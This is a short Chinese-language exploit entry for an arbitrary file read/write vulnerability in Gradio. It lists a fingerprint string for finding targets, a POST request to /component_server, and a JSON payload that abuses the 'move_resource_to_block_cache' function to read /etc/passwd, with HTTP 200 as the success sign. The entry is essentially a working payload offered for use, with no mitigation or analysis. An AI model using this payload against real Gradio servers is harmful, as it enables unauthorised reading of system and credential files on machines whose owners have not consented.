# gradio任意文件读取漏洞

gradio ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"**gradio\_mode**"`
- **请求**：`POST /component\_server HTTP/1.1`

**Payload**
```
{"component\_id": "1","data": "/etc/passwd","fn\_name": "move\_resource\_to\_block\_cache","session\_hash": "aaaaaaaaaaa"}
```
- **响应特征**：200